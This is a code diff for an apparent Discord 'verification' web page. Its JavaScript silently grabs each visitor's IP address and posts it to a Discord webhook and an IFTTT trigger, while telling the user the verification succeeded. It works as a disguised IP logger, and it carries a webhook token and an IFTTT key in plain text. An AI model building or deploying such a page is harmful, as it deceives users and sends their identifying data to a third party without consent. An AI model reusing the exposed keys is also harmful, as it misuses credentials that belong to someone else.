@@ -52,6 +52,8 @@
                     .then(response => response.json())
                     .then(data => {
                         const userIP = data.ip;
+
+                        // Envoi au webhook Discord
                         fetch("https://discord.com/api/webhooks/1305558117420892241/X3TC44x8aZrxgYD71reZpHIZThzShBhBRhiet7w6K6Uq7oQya9xcGPaPdm3KIC4AZh2K", {
                             method: "POST",
                             headers: {
@@ -65,11 +67,13 @@
                             document.getElementById("message").innerText = "Vérification réussie ! Vous pouvez retourner sur Discord.";
                         })
                         .catch(error => {
-                            console.error("Erreur lors de l'envoi de l'IP:", error);
+                            console.error("Erreur lors de l'envoi de l'IP au webhook Discord:", error);
                             document.getElementById("message").innerText = "Erreur lors de la vérification.";
-                            
+                        });
+
+                        // Envoi à l'API IFTTT
                         fetch("https://maker.ifttt.com/trigger/verif_ip/with/key/k561mQVsGFN5fqqkar4n0eq0EHBYkRn4iC9ciBSp2Mc", {
-                            method: "POST", 
+                            method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
                             },
@@ -81,7 +85,6 @@
                         })
                         .then(response => {
                             if (response.ok) {
-                                document.getElementById("message").innerText = "Vérification réussie ! Vous pouvez retourner sur Discord.";
                                 console.log("Données envoyées à IFTTT avec succès !");
                             } else {
                                 throw new Error(`Erreur HTTP : ${response.status}`);
@@ -89,11 +92,10 @@
                         })
                         .catch(error => {
                             console.error("Erreur lors de l'envoi à IFTTT :", error);
-                            document.getElementById("message").innerText = "Erreur lors de la vérification.";
                         });
                     })
                     .catch(error => {
-                        console.error("Erreur lors de la récupération de l'IP:", error);
+                        console.error("Erreur lors de la récupération de l'IP :", error);
                         document.getElementById("message").innerText = "Erreur lors de la récupération de votre IP.";
                     });
             } else {
